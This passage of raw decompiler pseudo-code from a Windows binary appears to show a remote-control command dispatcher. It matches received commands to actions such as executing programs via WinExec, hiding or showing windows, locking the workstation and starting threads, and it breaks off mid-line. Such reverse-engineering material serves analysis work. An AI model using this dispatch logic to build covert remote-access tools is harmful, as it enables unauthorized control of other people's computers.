fcn.00405964();\n                            var_4c4h = 0x496f52;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4c4h = 0x496f66;\n                                fcn.004059a4();\n                                var_4c4h = NULL;\n                                var_4c8h = 0;\n                                var_4cch = 0x10;\n                                var_4d0h = 0x496f74;\n                                var_4d0h = fcn.00409dd8();\n                                var_4d4h = 0x496f7a;\n                                sub.user32.dll_SendMessageA();\n                            }\n                            var_4d4h = &fcn.00493dac::var_470h;\n                            var_4d8h = 0x496f93;\n                            fcn.00405964();\n                            var_4d8h = 0x496fa3;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4d8h = 0x496fb7;\n                                fcn.004059a4();\n                                var_4d8h = 0x3;\n                                var_4dch = 0x496fc1;\n                                var_4dch = fcn.00409dd8();\n                                var_4e0h = 0x496fc7;\n                                sub.user32.dll_ShowWindow();\n                            }\n                            var_4e0h = &fcn.00493dac::var_474h;\n                            var_4e4h = 0x496fe0;\n                            fcn.00405964();\n                            var_4e4h = 0x496ff0;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4e4h = 0x497004;\n                                fcn.004059a4();\n                                var_4e4h = 6;\n                                var_4e8h = 0x49700e;\n                                var_4e8h = fcn.00409dd8();\n                                var_4ech = 0x497014;\n                                sub.user32.dll_ShowWindow();\n                            }\n                            var_4ech = &fcn.00493dac::var_478h;\n                            var_4f0h = 0x49702d;\n                            fcn.00405964();\n                            var_4f0h = 0x49703d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4f0h = 0x497051;\n                                fcn.004059a4();\n                                var_4f0h = NULL;\n                                var_4f4h = 0x49705b;\n                                var_4f4h = fcn.00409dd8();\n                                var_4f8h = 0x497061;\n                                sub.user32.dll_ShowWindow();\n                            }\n                            var_4f8h = &fcn.00493dac::var_47ch;\n                            var_4fch = 0x49707a;\n                            fcn.00405964();\n                            var_4fch = 0x49708a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4fch = 0x49709e;\n                                fcn.004059a4();\n                                var_4fch = 5;\n                                var_500h = 0x4970a8;\n                                var_500h = fcn.00409dd8();\n                                var_504h = 0x4970ae;\n                                sub.user32.dll_ShowWindow();\n                            }\n                            var_504h = &fcn.00493dac::var_480h;\n                            var_508h = 0x4970c7;\n                            fcn.00405964();\n                            var_508h = 0x4970d7;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_508h = 0x4970eb;\n                                fcn.004059a4();\n                                var_508h = &fcn.00493dac::var_ch;\n                                var_50ch = 0x4970fc;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_50ch = 0x49710c;\n                                fcn.00405964();\n                                var_50ch = 0x497119;\n                                fcn.00405a48();\n                                var_50ch = 0x497128;\n                                fcn.004059a4();\n                                var_50ch = 0x497133;\n                                fcn.00405504();\n                                var_50ch = 0x49713b;\n                                var_50ch = fcn.004058fc();\n                                var_510h = 0x497144;\n                                var_510h = fcn.00409dd8();\n                                var_514h = 0x49714a;\n                                sub.user32.dll_SetWindowTextA();\n                            }\n                            var_514h = &fcn.00493dac::var_484h;\n                            var_518h = 0x497163;\n                            fcn.00405964();\n                            var_518h = 0x497173;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_518h = 0x49718b;\n                                fcn.004059a4();\n                                var_518h = &fcn.00493dac::var_ch;\n                                var_51ch = 0x49719c;\n                                fcn.00405a48();\n                                var_51ch = 0x4971ac;\n                                fcn.00405964();\n                                var_51ch = 0x4971b9;\n                                fcn.00405a48();\n                                var_51ch = 0x4971c8;\n                                fcn.004059a4();\n                                var_51ch = &fcn.00493dac::var_10h;\n                                var_520h = 0x4971d9;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_520h = 0x4971e9;\n                                fcn.00405964();\n                                var_520h = 0x4971f6;\n                                fcn.00405a48();\n                                var_520h = 0x497205;\n                                fcn.004059a4();\n                                var_520h = 0x497210;\n                                fcn.00405504();\n                                var_524h = 0x49721c;\n                                var_520h = &stack0xfffffffc;\n                                fcn.0048dc84();\n                                var_524h = 0x49722d;\n                                fcn.00493ce0(var_520h);\n                            }\n                            var_520h = &fcn.00493dac::var_48ch;\n                            var_524h = 0x497247;\n                            fcn.00405964();\n                            var_524h = 0x497257;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_524h = 0x49726b;\n                                fcn.004059a4();\n                                var_524h = 0x497273;\n                                fcn.0048df30();\n                            }\n                            var_524h = &fcn.00493dac::var_490h;\n                            var_528h = 0x49728c;\n                            fcn.00405964();\n                            var_528h = 0x49729c;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_528h = 0x4972b0;\n                                fcn.004059a4();\n                                var_528h = &fcn.00493dac::var_ch;\n                                var_52ch = 0x4972c1;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_52ch = 0x4972d1;\n                                fcn.00405964();\n                                var_52ch = 0x4972de;\n                                fcn.00405a48();\n                                var_52ch = 0x4972ed;\n                                fcn.004059a4();\n                                var_52ch = 0x4972f8;\n                                fcn.00405504();\n                                var_52ch = 0x497303;\n                                fcn.0048dfe4();\n                            }\n                            var_52ch = &fcn.00493dac::var_494h;\n                            var_530h = 0x49731c;\n                            fcn.00405964();\n                            var_530h = 0x49732c;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_530h = 0x497340;\n                                fcn.004059a4();\n                                var_530h = 5;\n                                var_534h = 0x49734a;\n                                var_534h = fcn.004058fc();\n                                var_538h = 0x497350;\n                                sub.kernel32.dll_WinExec();\n                            }\n                            var_538h = &fcn.00493dac::var_498h;\n                            var_53ch = 0x497369;\n                            fcn.00405964();\n                            var_53ch = 0x497379;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_53ch = 0x497391;\n                                fcn.004059a4();\n                                var_53ch = &fcn.00493dac::var_ch;\n                                var_540h = 0x4973a2;\n                                fcn.00405a48();\n                                var_540h = 0x4973b2;\n                                fcn.00405964();\n                                var_540h = 0x4973bf;\n                                fcn.00405a48();\n                                var_540h = 0x4973ce;\n                                fcn.004059a4();\n                                var_540h = &fcn.00493dac::var_10h;\n                                var_544h = 0x4973df;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_544h = 0x4973ef;\n                                fcn.00405964();\n                                var_544h = 0x4973fc;\n                                fcn.00405a48();\n                                var_544h = 0x49740b;\n                                fcn.004059a4();\n                                var_544h = 0x497416;\n                                fcn.00405504();\n                                var_548h = 0x497422;\n                                var_544h = &stack0xfffffffc;\n                                fcn.00422280();\n                                var_548h = 0x497433;\n                                fcn.00493ce0(var_544h);\n                            }\n                            var_544h = &fcn.00493dac::var_4a0h;\n                            var_548h = 0x49744d;\n                            fcn.00405964();\n                            var_548h = 0x49745d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_548h = 0x497471;\n                                fcn.004059a4();\n                                var_548h = 0x49747c;\n                                fcn.0048b764();\n                                var_548h = 0x49748a;\n                                fcn.0048babc();\n                            }\n                            var_548h = &fcn.00493dac::var_4a8h;\n                            var_54ch = 0x4974a3;\n                            fcn.00405964();\n                            var_54ch = 0x4974b3;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_54ch = 0x4974c7;\n                                fcn.004059a4();\n                                var_54ch = 0x4974d2;\n                                fcn.0048b764();\n                                var_54ch = 0x4974e0;\n                                fcn.0048b9f4();\n                            }\n                            var_54ch = &fcn.00493dac::var_4b0h;\n                            var_550h = 0x4974f9;\n                            fcn.00405964();\n                            var_550h = 0x497509;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_550h = 0x49751d;\n                                fcn.004059a4();\n                                var_550h = 0x497525;\n                                fcn.004221f0();\n                            }\n                            var_550h = &fcn.00493dac::var_4b4h;\n                            var_554h = 0x49753e;\n                            fcn.00405964();\n                            var_554h = 0x49754e;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_554h = 0x497566;\n                                fcn.004059a4();\n                                var_554h = &fcn.00493dac::var_ch;\n                                var_558h = 0x497577;\n                                fcn.00405a48();\n                                var_558h = 0x497587;\n                                fcn.00405964();\n                                var_558h = 0x497594;\n                                fcn.00405a48();\n                                var_558h = 0x4975a3;\n                                fcn.004059a4();\n                                var_558h = &fcn.00493dac::var_10h;\n                                var_55ch = 0x4975b4;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_55ch = 0x4975c4;\n                                fcn.00405964();\n                                var_55ch = 0x4975d1;\n                                fcn.00405a48();\n                                var_55ch = 0x4975e0;\n                                fcn.004059a4();\n                                var_55ch = 0x4975eb;\n                                fcn.00405504();\n                                var_55ch = 0x4975f3;\n                                fcn.004058fc();\n                                var_55ch = 0x497600;\n                                fcn.00405664();\n                                var_55ch = var_4b8h;\n                                var_560h = 0x49760f;\n                                var_560h = fcn.004058fc();\n                                var_564h = 0x497618;\n                                fcn.004058fc();\n                                var_55ch = 0x49761f;\n                                fcn.00422490();\n                            }\n                            var_55ch = &fcn.00493dac::var_4bch;\n                            var_560h = 0x497638;\n                            fcn.00405964();\n                            var_560h = 0x497648;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_560h = 0x497660;\n                                fcn.004059a4();\n                                var_560h = &fcn.00493dac::var_ch;\n                                var_564h = 0x497671;\n                                fcn.00405a48();\n                                var_564h = 0x497681;\n                                fcn.00405964();\n                                var_564h = 0x49768e;\n                                fcn.00405a48();\n                                var_564h = 0x49769d;\n                                fcn.004059a4();\n                                var_564h = &fcn.00493dac::var_10h;\n                                var_568h = 0x4976ae;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_568h = 0x4976be;\n                                fcn.00405964();\n                                var_568h = 0x4976cb;\n                                fcn.00405a48();\n                                var_568h = 0x4976da;\n                                fcn.004059a4();\n                                var_568h = 0x4976e5;\n                                fcn.00405504();\n                                var_56ch = 0x4976f1;\n                                var_568h = &stack0xfffffffc;\n                                fcn.0048316c();\n                                var_56ch = 0x497702;\n                                fcn.00493ce0(var_568h);\n                            }\n                            var_568h = &fcn.00493dac::var_4c4h;\n                            var_56ch = 0x49771c;\n                            fcn.00405964();\n                            var_56ch = 0x49772c;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_56ch = 0x497744;\n                                fcn.004059a4();\n                                var_56ch = &fcn.00493dac::var_ch;\n                                var_570h = 0x497755;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_570h = 0x497765;\n                                fcn.00405964();\n                                var_570h = 0x497772;\n                                fcn.00405a48();\n                                var_570h = 0x497781;\n                                fcn.004059a4();\n                                var_570h = 0x49778c;\n                                fcn.00405504();\n                                var_570h = 0x497797;\n                                fcn.00405504();\n                                var_570h = 0x4977a9;\n                                fcn.004059a4();\n                                var_570h = &fcn.00493dac::var_ch;\n                                var_574h = 0x4977bf;\n                                fcn.00405964();\n                                var_574h = 0x49c22c;\n                                var_578h = var_14h;\n                                var_57ch = 0x49c22c;\n                                var_580h = 0x4977dc;\n                                fcn.00405800();\n                                var_580h = 0x4977ed;\n                                fcn.00483938();\n                            }\n                            var_580h = 0x4977fa;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_580h = 0x497801;\n                                fcn.00483a14();\n                            }\n                            var_580h = &fcn.00493dac::var_4cch;\n                            var_584h = 0x49781a;\n                            fcn.00405964();\n                            var_584h = 0x49782a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_584h = 0x497842;\n                                fcn.004059a4();\n                                var_584h = &fcn.00493dac::var_ch;\n                                var_588h = 0x497853;\n                                fcn.00405a48();\n                                var_588h = 0x497863;\n                                fcn.00405964();\n                                var_588h = 0x497870;\n                                fcn.00405a48();\n                                var_588h = 0x49787f;\n                                fcn.004059a4();\n                                var_588h = &fcn.00493dac::var_10h;\n                                var_58ch = 0x497890;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_58ch = 0x4978a0;\n                                fcn.00405964();\n                                var_58ch = 0x4978ad;\n                                fcn.00405a48();\n                                var_58ch = 0x4978bc;\n                                fcn.004059a4();\n                                var_58ch = 0x4978c7;\n                                fcn.00405504();\n                                var_58ch = var_10h;\n                                var_590h = 0x4978db;\n                                fcn.00485e8c(var_10h);\n                            }\n                            var_590h = 0x4978e8;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x497925;\n                                var_598h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_598h;\n                                var_59ch = 0x2;\n                                var_5a0h = 0x49790a;\n                                var_590h = &stack0xfffffffc;\n                                fcn.00482674();\n                                var_5a0h = var_4d0h;\n                                var_5a4h = 0x497916;\n                                (**(*var_4d0h + 0x74))();\n                                var_59ch = 0x49791b;\n                                fcn.0040704c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = var_598h;\n                            }\n                            var_590h = 0x49793c;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x497979;\n                                var_598h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_598h;\n                                var_59ch = 0xa;\n                                var_5a0h = 0x49795e;\n                                var_590h = &stack0xfffffffc;\n                                fcn.00482674();\n                                var_5a0h = var_4d4h;\n                                var_5a4h = 0x49796a;\n                                (**(*var_4d4h + 0x74))();\n                                var_59ch = 0x49796f;\n                                fcn.0040704c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = var_598h;\n                            }\n                            var_590h = 0x497990;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x4979cd;\n                                var_598h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_598h;\n                                var_59ch = 0x22;\n                                var_5a0h = 0x4979b2;\n                                var_590h = &stack0xfffffffc;\n                                fcn.00482674();\n                                var_5a0h = var_4d8h;\n                                var_5a4h = 0x4979be;\n                                (**(*var_4d8h + 0x74))();\n                                var_59ch = 0x4979c3;\n                                fcn.0040704c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = var_598h;\n                            }\n                            var_590h = 0x4979e4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x497a21;\n                                var_598h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_598h;\n                                var_59ch = 0x1;\n                                var_5a0h = 0x497a06;\n                                var_590h = &stack0xfffffffc;\n                                fcn.00482674();\n                                var_5a0h = var_4dch;\n                                var_5a4h = 0x497a12;\n                                (**(*var_4dch + 0x74))();\n                                var_59ch = 0x497a17;\n                                fcn.0040704c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = var_598h;\n                            }\n                            var_590h = 0x497a38;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x497a73;\n                                var_598h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_598h;\n                                var_59ch = 0x497a58;\n                                var_590h = &stack0xfffffffc;\n                                fcn.00482674();\n                                var_59ch = var_4e0h;\n                                var_5a0h = 0x497a64;\n                                (**(*var_4e0h + 0x3c))();\n                                var_59ch = 0x497a69;\n                                fcn.0040704c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = var_598h;\n                            }\n                            var_590h = 0x497a8a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_590h = 0x497a9b;\n                                var_590h = fcn.00405c48();\n                                var_594h = 0x497aac;\n                                fcn.00482674();\n                                var_594h = var_4e8h;\n                                var_598h = 0x497abb;\n                                (**(*var_4e8h + 0x90))();\n                                var_598h = 0x497ac0;\n                                fcn.0040704c();\n                                var_598h = 0x497ace;\n                                fcn.004056f4();\n                                var_598h = 0x497ad9;\n                                var_598h = fcn.00405c48();\n                                var_59ch = 0x497aea;\n                                fcn.00482674();\n                                var_59ch = var_4f0h;\n                                var_5a0h = 0x497af6;\n                                (**(*var_4f0h + 0x24))();\n                                var_5a0h = 0x497afb;\n                                fcn.0040704c();\n                                var_5a0h = 0x497b09;\n                                fcn.004056f4();\n                                var_5a0h = 0x497b0e;\n                                cVar1 = fcn.004826e0();\n                                if (cVar1 == '\\x01') {\n                                    var_5a0h = 0x497b1d;\n                                    var_5a0h = fcn.00405c48();\n                                    var_5a4h = 0x497b2e;\n                                    fcn.00482674();\n                                    var_5a4h = var_4f8h;\n                                    var_5a8h = 0x497b3a;\n                                    (**(*var_4f8h + 0x6c))();\n                                    var_5a0h = 0x497b3f;\n                                    fcn.0040704c();\n                                    var_5a0h = 0x497b4d;\n                                    fcn.004056f4();\n                                }\n                                var_5a0h = 0x497b52;\n                                cVar1 = fcn.004826e0();\n                                if (cVar1 == '\\x01') {\n                                    var_5a0h = 0x497b61;\n                                    var_5a0h = fcn.00405c48();\n                                    var_5a4h = 0x497b72;\n                                    fcn.00482674();\n                                    var_5a4h = var_500h;\n                                    var_5a8h = 0x497b7e;\n                                    (**(*var_500h + 0x70))();\n                                    var_5a0h = 0x497b83;\n                                    fcn.0040704c();\n                                    var_5a0h = 0x497b91;\n                                    fcn.004056f4();\n                                }\n                                var_5a0h = 0x497b9c;\n                                var_5a0h = fcn.00405c48();\n                                var_5a4h = 0x497bad;\n                                fcn.00482674();\n                                var_5a4h = var_508h;\n                                var_5a8h = 0x497bbc;\n                                (**(*var_508h + 0x80))();\n                                var_560h = 0x497bc1;\n                                fcn.0040704c();\n                                var_560h = 0x497bcf;\n                                fcn.004056f4();\n                                if (var_ch == NULL) {\n                                    var_560h = 0x497be2;\n                                    fcn.00405504();\n                                }\n                                if (var_10h == NULL) {\n                                    var_560h = 0x497bf5;\n                                    fcn.00405504();\n                                }\n                                if (var_14h == 0) {\n                                    var_560h = 0x497c08;\n                                    fcn.00405504();\n                                }\n                                if (var_18h == 0) {\n                                    var_560h = 0x497c1b;\n                                    fcn.00405504();\n                                }\n                                uVar13 = var_1ch == NULL;\n                                if (uVar13) {\n                                    var_560h = 0x497c2e;\n                                    fcn.00405504();\n                                }\n                                var_560h = 0x49c2ec;\n                                var_564h = var_ch;\n                                var_568h = 0x49b8bc;\n                                var_56ch = var_10h;\n                                var_570h = 0x49b8bc;\n                                var_574h = var_14h;\n                                var_578h = 0x49b8bc;\n                                var_57ch = var_18h;\n                                var_580h = 0x49b8bc;\n                                var_584h = var_1ch;\n                                var_588h = 0x49b8bc;\n                                var_58ch = 0x497c66;\n                                fcn.0048277c();\n                                var_58ch = var_510h;\n                                var_590h = 0x497c7c;\n                                fcn.00405800();\n                                var_590h = 0x497c87;\n                                fcn.004938a4();\n                            }\n                            var_590h = &fcn.00493dac::var_514h;\n                            var_594h = 0x497ca0;\n                            fcn.00405964();\n                            var_594h = 0x497cb0;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_594h = 0x497cc8;\n                                fcn.004059a4();\n                                var_594h = &fcn.00493dac::var_ch;\n                                var_598h = 0x497cd9;\n                                fcn.00405a48();\n                                var_598h = 0x497ce9;\n                                fcn.00405964();\n                                var_598h = 0x497cf6;\n                                fcn.00405a48();\n                                var_598h = 0x497d05;\n                                fcn.004059a4();\n                                var_598h = &fcn.00493dac::var_10h;\n                                var_59ch = 0x497d16;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_59ch = 0x497d26;\n                                fcn.00405964();\n                                var_59ch = 0x497d33;\n                                fcn.00405a48();\n                                var_59ch = 0x497d42;\n                                fcn.004059a4();\n                                var_59ch = 0x497d4d;\n                                fcn.00405504();\n                                var_5a0h = 0x497d59;\n                                var_59ch = &stack0xfffffffc;\n                                fcn.00482a00();\n                                var_5a0h = 0x497d6a;\n                                fcn.00493ce0(var_59ch);\n                            }\n                            var_59ch = &fcn.00493dac::var_51ch;\n                            var_5a0h = 0x497d84;\n                            fcn.00405964();\n                            var_5a0h = 0x497d94;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5a0h = 0x497da8;\n                                fcn.004059a4();\n                                var_5a0h = 0x497dad;\n                                cVar1 = fcn.004826e0();\n                                uVar13 = cVar1 == '\\x01';\n                                if (uVar13) {\n                                    var_5a0h = 0x497db9;\n                                    fcn.00482d88();\n                                }\n                            }\n                            var_5a0h = &fcn.00493dac::var_520h;\n                            var_5a4h = 0x497dd2;\n                            fcn.00405964();\n                            var_5a4h = 0x497de2;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5a4h = 0x497df6;\n                                fcn.004059a4();\n                                var_5a4h = 0x497dfb;\n                                cVar1 = fcn.004826e0();\n                                uVar13 = cVar1 == '\\x01';\n                                if (uVar13) {\n                                    var_5a4h = 0x497e07;\n                                    fcn.00482980();\n                                }\n                            }\n                            var_5a4h = &fcn.00493dac::var_524h;\n                            var_5a8h = 0x497e20;\n                            fcn.00405964();\n                            var_5a8h = 0x497e30;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5a8h = 0x497e44;\n                                fcn.004059a4();\n                                var_5a8h = 0x497e49;\n                                cVar1 = fcn.004826e0();\n                                uVar13 = cVar1 == '\\x01';\n                                if (uVar13) {\n                                    var_5a8h = 0x497e55;\n                                    fcn.00482ed4();\n                                }\n                            }\n                            var_5a8h = &fcn.00493dac::var_528h;\n                            var_5ach = 0x497e6e;\n                            fcn.00405964();\n                            var_5ach = 0x497e7e;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5ach = 0x497e92;\n                                fcn.004059a4();\n                                var_5ach = 0x497e97;\n                                cVar1 = fcn.004826e0();\n                                uVar13 = cVar1 == '\\x01';\n                                if (uVar13) {\n                                    var_5ach = 0x497ea3;\n                                    fcn.00483020();\n                                }\n                            }\n                            var_5ach = &fcn.00493dac::var_52ch;\n                            var_5b0h = 0x497ebc;\n                            fcn.00405964();\n                            var_5b0h = 0x497ecc;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5b0h = 0x497ee0;\n                                fcn.004059a4();\n                                **0x4a4e80 = 1;\n                                var_5b0h = *0x4a4fc0;\n                                var_5b4h = 0x497efe;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_5b4h = 0x497f0e;\n                                fcn.00405964();\n                                var_5b4h = 0x497f1b;\n                                fcn.00405a48();\n                                var_5b4h = 0x497f2a;\n                                fcn.004059a4();\n                                var_5b4h = 0x497f37;\n                                fcn.004054c0();\n                            }\n                            var_5b4h = 0x497f44;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                **0x4a4e80 = 0;\n                            }\n                            var_5b4h = &fcn.00493dac::var_530h;\n                            var_5b8h = 0x497f68;\n                            fcn.00405964();\n                            var_5b8h = 0x497f78;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5b8h = 0x497f90;\n                                fcn.004059a4();\n                                if (**0x4a4ccc == 1) {\n                                    var_5b8h = 0x497fa4;\n                                    fcn.004938a4();\n                                }\n                                var_5b8h = &fcn.00493dac::var_ch;\n                                var_5bch = 0x497fb5;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_5bch = 0x497fc5;\n                                fcn.00405964();\n                                var_5bch = 0x497fd2;\n                                fcn.00405a48();\n                                var_5bch = 0x497fe1;\n                                fcn.004059a4();\n                                var_5bch = 0x497fec;\n                                fcn.00405504();\n                                var_5c0h = 0x497ff8;\n                                var_5bch = &stack0xfffffffc;\n                                fcn.0048d2c8();\n                                var_5c0h = 0x498008;\n                                fcn.00405738();\n                                var_5c0h = 0x498019;\n                                fcn.00487e74();\n                                var_5c0h = 0x49802a;\n                                fcn.00493ce0(var_5bch);\n                            }\n                            var_5bch = 0x498038;\n                            fcn.00405894();\n                            if ((uVar13) && (uVar13 = **0x4a4ccc == 1,  !uVar13)) {\n                                var_5bch = &fcn.00493dac::var_4h;\n                                var_5c0h = NULL;\n                                var_5c4h = NULL;\n                                var_5c8h = 0x4890a8;\n                                var_5cch = 0;\n                                var_5d0h = NULL;\n                                var_5d4h = 0x49805a;\n                                sub.kernel32.dll_CreateThread();\n                                **0x4a4ccc = 1;\n                            }\n                            var_5bch = 0x498072;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                **0x4a4ccc = 0;\n                            }\n                            var_5bch = 0x49808a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                **0x4a4e80 = 1;\n                            }\n                            var_5bch = 0x4980a4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                **0x4a4e80 = 0;\n                            }\n                            var_5bch = &fcn.00493dac::var_53ch;\n                            var_5c0h = 0x4980c8;\n                            fcn.00405964();\n                            var_5c0h = 0x4980d8;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5c0h = 0x4980f0;\n                                fcn.004059a4();\n                                var_5c0h = &fcn.00493dac::var_ch;\n                                var_5c4h = 0x498101;\n                                fcn.00405a48();\n                                var_5c4h = 0x498111;\n                                fcn.00405964();\n                                var_5c4h = 0x49811e;\n                                fcn.00405a48();\n                                var_5c4h = 0x49812d;\n                                fcn.004059a4();\n                                var_5c4h = &fcn.00493dac::var_10h;\n                                var_5c8h = 0x49813e;\n                                fcn.00405a48();\n                                var_5c8h = 0x49814e;\n                                fcn.00405964();\n                                var_5c8h = 0x49815b;\n                                fcn.00405a48();\n                                var_5c8h = 0x49816a;\n                                fcn.004059a4();\n                                var_5c8h = 0x498175;\n                                fcn.00405504();\n                                var_5c8h = 0x498180;\n                                fcn.0048d2c8();\n                                var_5c8h = var_544h;\n                                var_5cch = 0x49c3d4;\n                                var_5d0h = var_ch;\n                                var_5d4h = 0x49819e;\n                                fcn.00405800();\n                                var_5d4h = 0x4981a9;\n                                cVar1 = fcn.0040a168();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    *in_FS_OFFSET = var_5d0h;\n                                    goto code_r0x0049b71b;\n                                }\n                                var_5d8h = 0x4981c6;\n                                var_5d4h = &stack0xfffffffc;\n                                fcn.0048d2c8();\n                                var_5d8h = var_550h;\n                                var_5dch = 0x49c3d4;\n                                var_5e0h = var_ch;\n                                var_5e4h = 0x4981e4;\n                                fcn.00405800();\n                                var_5e4h = 0x4981f5;\n                                fcn.0048e0b0();\n                                var_5e4h = 0x498206;\n                                fcn.00493ce0(var_5e0h);\n                            }\n                            var_5e0h = 0x498214;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = 0x498220;\n                                fcn.0048d8a4();\n                            }\n                            var_5e0h = 0x49822d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = 0x498239;\n                                fcn.0048d8a4();\n                            }\n                            var_5e0h = 0x498246;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = 0x498252;\n                                fcn.0048d8a4();\n                            }\n                            var_5e0h = 0x49825f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = 0x49826b;\n                                fcn.0048d8a4();\n                            }\n                            var_5e0h = 0x498278;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = NULL;\n                                var_5e4h = 0xf140;\n                                var_5e8h = 0x112;\n                                var_5ech = NULL;\n                                var_5f0h = 0x49828d;\n                                sub.user32.dll_SendMessageA();\n                            }\n                            var_5e0h = 0x49829a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e0h = 0x4982a1;\n                                sub.user32.dll_LockWorkStation();\n                            }\n                            var_5e0h = &fcn.00493dac::var_554h;\n                            var_5e4h = 0x4982ba;\n                            fcn.00405964();\n                            var_5e4h = 0x4982ca;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_5e4h = 0x4982e2;\n                                fcn.004059a4();\n                                var_5e4h = &fcn.00493dac::var_10h;\n                                var_5e8h = 0x4982f3;\n                                fcn.00405a48();\n                                var_5e8h = 0x498303;\n                                fcn.00405964();\n                                var_5e8h = 0x498310;\n                                fcn.00405a48();\n                                var_5e8h = 0x49831f;\n                                fcn.004059a4();\n                                var_5e8h = &fcn.00493dac::var_14h;\n                                var_5ech = 0x498330;\n                                fcn.00405a48();\n                                var_5ech = 0x498340;\n                                fcn.00405964();\n                                var_5ech = 0x49834d;\n                                fcn.00405a48();\n                                var_5ech = 0x49835c;\n                                fcn.004059a4();\n                                var_5ech = 0x498367;\n                                fcn.00405504();\n                                var_5ech = 0x49837a;\n                                fcn.00405664();\n                                var_5ech = var_558h;\n                                var_5f0h = 0x49bd78;\n                                var_5f4h = 0x498398;\n                                fcn.00409c6c();\n                                var_5f4h = var_55ch;\n                                var_5f8h = 0x49bd78;\n                                var_5fch = 0x4983ae;\n                                fcn.0048c9f8();\n                                var_5fch = var_560h;\n                                var_600h = 0x49bd78;\n                                var_604h = 0x4983c4;\n                                fcn.0048c1cc();\n                                var_604h = var_564h;\n                                var_608h = 0x49bc34;\n                                var_60ch = 0x4983da;\n                                fcn.0048c190();\n                                var_60ch = var_568h;\n                                var_610h = 0x49bd78;\n                                puStack1560 = 0x4983f0;\n                                fcn.0048c718();\n                                puStack1560 = var_56ch;\n                                uStack1564 = 0x49bd78;\n                                puStack1568 = 0x498406;\n                                fcn.0048b048();\n                                puStack1568 = var_570h;\n                                uStack1572 = 0x49bd78;\n                                uStack1576 = 0x49c510;\n                                uStack1580 = 0x49bd78;\n                                iStack1584 = 0x498426;\n                                fcn.0048c270();\n                                iStack1584 = var_574h;\n                                uStack1588 = 0x49bd78;\n                                iStack1592 = 0x49843c;\n                                fcn.0048c434();\n                                iStack1592 = var_578h;\n                                uStack1596 = 0x49bd78;\n                                var_63ch = 0x498452;\n                                fcn.0048c4e4();\n                                var_63ch = var_57ch;\n                                iStack1604 = 0x49bd78;\n                                puStack1608 = 0x498468;\n                                fcn.0048c590();\n                                puStack1608 = var_580h;\n                                uStack1612 = 0x49bd78;\n                                puStack1616 = 0x49847e;\n                                fcn.0048c650();\n                                puStack1616 = var_584h;\n                                uStack1620 = 